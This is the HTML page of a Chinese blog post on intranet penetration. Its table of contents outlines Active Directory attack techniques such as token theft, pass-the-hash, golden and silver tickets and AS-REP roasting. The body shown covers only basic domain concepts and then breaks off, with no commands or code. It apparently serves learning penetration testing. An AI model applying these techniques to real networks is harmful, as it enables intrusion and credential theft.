
  <!DOCTYPE html>
  <html lang="en"  
    
      data-theme-mode="auto"
    
  >
  <head>
  
  <meta charset="utf-8">
  

  

  

  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"复制成功","zh-CN":"复制成功","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"复制失败","zh-CN":"复制失败","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
  
  <title>
    内网渗透 |
    
    mX1@0_blog
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  
  
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
    
<link rel="stylesheet" href="/css/loader.css">

  
  
    <meta name="description" content="内网渗透内网基础知识工作组工作组：工作组是局域网中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 computer 按照不同的要求分类到不同的组 域域:用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域 (Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级">
<meta property="og:type" content="article">
<meta property="og:title" content="内网渗透">
<meta property="og:url" content="http://example.com/2024/09/23/nei-wang-shen-tou/index.html">
<meta property="og:site_name" content="mX1@0_blog">
<meta property="og:description" content="内网渗透内网基础知识工作组工作组：工作组是局域网中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 computer 按照不同的要求分类到不同的组 域域:用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域 (Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f16888f21886ccc0da8761.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f168b0f21886ccc0daadb2.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f168d6f21886ccc0dace84.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f168fbf21886ccc0daf413.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f16958f21886ccc0db509b.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f250e7f21886ccc08b2fa6.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f2564ef21886ccc08fe2c8.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f25acbf21886ccc093a413.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f25b93f21886ccc094700b.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f25ce6f21886ccc095e14b.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f25d7df21886ccc0969528.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f25dbcf21886ccc096e412.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f26431f21886ccc09dce74.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f26566f21886ccc09edde6.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f2d768f21886ccc011688a.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f2d7b9f21886ccc011d5d9.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f2d802f21886ccc012340b.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f2d8cbf21886ccc01325b4.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f4e701f21886ccc0a5e137.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f4ed8ef21886ccc0ab44b4.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f60792f21886ccc0874ccb.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f6111df21886ccc09091fa.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f61c91f21886ccc09a1c4d.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f61dbbf21886ccc09b094a.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f62103f21886ccc09df266.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f62267f21886ccc09f264f.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66f6741cf21886ccc0fabce5.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fb6932f21886ccc09121db.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fb6a7af21886ccc0920b29.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fb6a91f21886ccc0921a36.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fb6b01f21886ccc09262a7.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fb6c30f21886ccc09352b3.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fbed4df21886ccc0053b5a.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6700ded4d29ded1a8cb9fc4d.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fbf192f21886ccc0094eb2.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fe09a40a206445e38972f3.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fe0be20a206445e38b5559.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/66fe0fa40a206445e38e68d2.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6717644cd29ded1a8c256aca.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67176476d29ded1a8c25cff3.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67176491d29ded1a8c2615ef.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/671764e2d29ded1a8c26c4e7.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/671764fad29ded1a8c26f7d6.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/67176512d29ded1a8c272281.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/671767e9d29ded1a8c2d703e.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6717680fd29ded1a8c2dc5f6.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718a718d29ded1a8c9e8f37.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718a758d29ded1a8c9ecf56.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718a7a6d29ded1a8c9f0ec7.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718b942d29ded1a8cb1fbc8.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718b966d29ded1a8cb21a2f.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718b989d29ded1a8cb23958.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718c0ced29ded1a8cba1029.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718c0f3d29ded1a8cba3130.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718c128d29ded1a8cba6094.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718c142d29ded1a8cba7584.png">
<meta property="og:image" content="https://pic.imgdb.cn/item/6718c18ed29ded1a8cbab53a.png">
<meta property="article:published_time" content="2024-09-23T12:19:16.827Z">
<meta property="article:modified_time" content="2025-08-20T15:34:52.170Z">
<meta property="article:author" content="mX1@0">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/66f16888f21886ccc0da8761.png">
  
  
  
    <link rel="shortcut icon" href="/images/%E5%9B%BE1.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">

  
  
  
<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

  <body>
    
    
  <div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi rotate">
        
          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
          </svg>
        
      </div>
      
      
        
      
      <div class="loading-word">加载中...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>
<div id="heatmap-tooltip"></div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/">首页</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/archives">归类</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/about">关于</a>
        </span>
      
        <span class="main-nav-link-wrap">
          <div class="main-nav-icon icon rotate">
             
              &#xe62b;
             
          </div>
          <a class="main-nav-link" href="/friend">友链</a>
        </span>
      
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
    
    
  </nav>
  
</div>
<header id="header">
  
    
      
        <picture>
          
        </picture>
        
          <img  fetchpriority="high" src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" alt="内网渗透">
        
      
    
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">内网渗透</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content" class="sidebar-left"  >
          <aside id="sidebar">
  
  
  
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        
          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">内网基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-text">工作组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F"><span class="toc-text">域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%AF%E5%A2%83"><span class="toc-text">域的几种环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8DNS"><span class="toc-text">域名服务器DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%9C%AF%E8%AF%AD"><span class="toc-text">域术语</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-1"><span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-text">域信息收集命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-MSF-%E7%9A%84%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-text">基于 MSF 的内网主机探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E4%B8%8E%E6%9C%8D%E5%8A%A1"><span class="toc-text">常见端口与服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-text">域渗透思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Token"><span class="toc-text">内网渗透 Token</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AccessToken-%E7%9A%84%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-text">AccessToken 的窃取与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-incognito"><span class="toc-text">1.incognito</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-MSF-%E4%B8%8B%E7%9A%84-incognito-%E6%A8%A1%E5%9D%97"><span class="toc-text">2.MSF 下的 incognito 模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-msf-%E4%BB%A4%E7%89%8C%E5%AE%9E%E6%88%98"><span class="toc-text">3.msf 令牌实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH-pass-the-hash-HASH-%E4%BC%A0%E9%80%92"><span class="toc-text">PTH(pass-the-hash) HASH 传递</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mimitkaz-pth"><span class="toc-text">mimitkaz pth</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec"><span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-msf-hash-%E6%A8%A1%E5%9D%97"><span class="toc-text">使用 msf hash 模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CrackMapExec"><span class="toc-text">CrackMapExec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI"><span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmic-%E5%91%BD%E4%BB%A4"><span class="toc-text">wmic 命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmiexec-py"><span class="toc-text">wmiexec.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmiexec-vbs"><span class="toc-text">wmiexec.vbs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Invoke-WmiCommand"><span class="toc-text">Invoke-WmiCommand</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Invoke-WMIMethod"><span class="toc-text">Invoke-WMIMethod</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmic-%E7%9A%84%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"><span class="toc-text">wmic 的其他命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB-Pass-the-Ticket"><span class="toc-text">PTT 票据传递攻击(Pass the Ticket)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberos-%E5%8D%8F%E8%AE%AE-Kerberos-%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86"><span class="toc-text">Kerberos 协议&amp; Kerberos 认证原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86"><span class="toc-text">Kerberos 认证原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E5%9B%BE%EF%BC%9A"><span class="toc-text">总图：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AS-REQ-AS-REP"><span class="toc-text">AS_REQ &amp; AS_REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TGS-REQ-TGS-REP"><span class="toc-text">TGS_REQ &amp; TGS_REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AP-REQ-AP-REP"><span class="toc-text">AP-REQ &amp; AP-REP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC"><span class="toc-text">PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E8%AE%A4%E8%AF%81%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%A6%82%E8%BF%B0"><span class="toc-text">Kerberos 认证中的相关安全问题概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88Golden-ticket%EF%BC%89"><span class="toc-text">黄金票据（Golden ticket）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%EF%BC%88Silver-ticket%EF%BC%89"><span class="toc-text">白银票据（Silver ticket）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS14-068"><span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB%EF%BC%88Password-Spraying%EF%BC%89"><span class="toc-text">密码喷洒攻击（Password Spraying）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-text">AS-REP Roasting</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-text">票据传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-ticket"><span class="toc-text">黄金票据 Golden ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%89%B9%E7%82%B9"><span class="toc-text">2.特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C%E4%BB%8B%E7%BB%8D"><span class="toc-text">3.具体操作介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BC%AA%E9%80%A0%E5%87%AD%E6%8D%AE%EF%BC%8C%E6%8F%90%E5%8D%87%E5%9F%9F%E5%86%85%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-text">一、伪造凭据，提升域内普通用户的权限</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BC%AA%E9%80%A0%E9%87%91%E7%A5%A8"><span class="toc-text">二、伪造金票</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%87%91%E7%A5%A8%E7%9A%84%E4%BD%BF%E7%94%A8-%E6%99%AE%E9%80%9A%E5%9F%9F%E8%B4%A6%E6%88%B7%EF%BC%8C%E5%88%A9%E7%94%A8%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%8C%E5%88%9B%E5%BB%BA%E5%9F%9F%E7%AE%A1%E8%B4%A6%E6%88%B7"><span class="toc-text">三、金票的使用(普通域账户，利用黄金票据，创建域管账户)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-SILVER-TICKET"><span class="toc-text">白银票据 SILVER TICKET</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-1"><span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%89%B9%E7%82%B9-1"><span class="toc-text">2.特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C%E4%BB%8B%E7%BB%8D-1"><span class="toc-text">3.具体操作介绍</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%91%E7%A5%A8%E5%92%8C%E9%93%B6%E7%A5%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">金票和银票的区别</span></a></li></ol></li></ol></li></ol></li></ol>
      
  </div>
</div>
</div>
          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
  <div class="sidebar-author-name">mX1@0</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Post</div>
    <div class="sidebar-state-number">54</div>
  </div>
  <div class="sidebar-state-category">
    <div>Category</div>
    <div class="sidebar-state-number">25</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tag</div>
    <div class="sidebar-state-number">65</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-twitter sidebar-social-icon">
      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">首页</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">归类</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">关于</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">友链</div>
      </div>
    
  
</div>
</div>
        
      
      
        
          <div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div>
        
      
    </div>
  </div>

  <div class="sidebar-widget">
  
  </div>
  
</aside>

          <section id="main"><article id="post-内网渗透" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <span class="article-date-link" data-aos="zoom-in">
    <time datetime="2024-09-23T12:19:16.827Z" itemprop="datePublished">2024-09-23</time>
    <time style="display: none;" id="post-update-time">2025-08-20</time>
  </span>
</div>

      
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/" data-aos="zoom-in">笔记学习</a>
  </div>


    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组：工作组是局域网中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行<strong>资源管理</strong>，将不同的 computer 按照不同的要求分类到不同的组</p>
<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域:用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域 (Domain)是一个<strong>有安全边界的计算机集合</strong>（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个**<u>更加严格的安全管理控制机制</u>**，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p>
<h3 id="域的几种环境"><a href="#域的几种环境" class="headerlink" title="域的几种环境"></a>域的几种环境</h3><ol>
<li>单域</li>
</ol>
<p>通常一个小公司，一般一个域就可以，一个域内，要至少两台域服务器，一 台作为域控制器，另一台当备份。</p>
<ol start="2">
<li><p>父域和子域</p>
</li>
<li><p>域森林</p>
</li>
</ol>
<p>指的是多个域树通过建立信任关系组成的集合 比如：一个公司并购其他公司</p>
<h3 id="域名服务器DNS"><a href="#域名服务器DNS" class="headerlink" title="域名服务器DNS"></a>域名服务器DNS</h3><p><strong>从对域树的介绍中来看出</strong>，<strong>域树中的域名和</strong> DNS <strong>域名非常相似</strong>。而实际上，因为域名的计算机是使用 DNS 来定位域控制器、服务器及其他计算机、网络服务的，所以域的名字就是 DNS 域的名字。</p>
<p><strong><u>在内网渗透测试中，大都是通过寻找 DNS 服务器来确定域控制器的位置的{DNS 服务器和域控制器通常配置在同一台机器上}</u></strong></p>
<h3 id="域术语"><a href="#域术语" class="headerlink" title="域术语"></a>域术语</h3><p>DC:域控，域的创建者 </p>
<p>域管理:域控上的管理员 </p>
<p>AD 活得目录:Active Directory </p>
<p>NTDS.dit:域用户帐户以域数据库的形式保存在活动目录中 </p>
